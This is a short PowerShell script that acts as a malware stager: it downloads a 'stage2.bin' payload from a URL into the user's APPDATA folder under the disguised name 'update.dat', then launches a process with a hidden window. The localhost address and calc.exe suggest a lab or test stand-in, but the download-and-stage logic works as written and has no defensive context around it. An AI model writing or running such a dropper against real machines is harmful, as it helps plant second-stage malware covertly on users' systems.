
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://127.0.0.1/cdn/stage2.bin",
    [string]$PayloadPath = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $PayloadPath)
Start-Process -FilePath 'calc.exe' -WindowStyle Hidden
$StageMarker = "stage-12"
